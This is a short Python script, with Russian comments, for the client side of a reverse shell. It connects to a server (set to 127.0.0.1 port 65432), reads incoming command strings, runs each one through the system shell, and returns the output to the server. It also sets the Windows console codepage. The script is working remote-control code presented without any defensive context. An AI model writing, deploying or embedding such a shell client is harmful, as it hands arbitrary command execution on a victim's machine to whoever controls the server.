import socket
import os
import subprocess
import asyncio
async def client(host, port):
  subprocess.run("chcp 437", shell=True)
  # подключаемся к нашему серверу
  reader, writer = await asyncio.open_connection(host, port)
  # ждем ответа сервера(обрабатываем по 100 байт данных)
  while True:
    data = await reader.read(4096)
    if not data:
      break
    # получаем команду и выводим в командную строку
    result = subprocess.run(data.decode("utf-8"), shell=True, capture_output=True, text=True)

    output = result.stdout.strip() or result.stderr.strip()

    writer.write(output.encode("utf-8"))

    await writer.drain()

if __name__ == "__main__":
  asyncio.run(client('127.0.0.1', 65432))
